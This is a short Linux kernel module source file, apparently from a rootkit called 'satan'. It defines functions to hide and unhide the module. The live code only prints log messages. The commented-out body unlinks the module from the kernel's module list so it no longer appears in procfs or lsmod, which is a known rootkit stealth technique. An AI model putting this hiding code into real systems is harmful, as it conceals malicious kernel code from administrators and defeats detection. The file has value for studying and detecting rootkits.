// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "module.h"

#include <linux/list.h>
#include <linux/module.h>

static bool is_hidden = false;
static struct list_head *module_prev = NULL;

bool satan_is_hidden(void)
{
        return is_hidden;
}

void satan_set_hidden(bool hidden)
{
        if (hidden) {
                pr_info("satan: hiding...\n");
        } else {
                pr_info("satan: unhiding...\n");
        }
        /*
        if (is_hidden == hidden)
                return;

        if (hidden) {  // hide module
                module_prev = THIS_MODULE->list.prev;  // backup prev node in module list.
                list_del(&THIS_MODULE->list);  // removes from procfs
        } else {  // unhide module
                list_add(&THIS_MODULE->list, module_prev);
                module_prev = NULL;
        }

        is_hidden = hidden;
        */
}
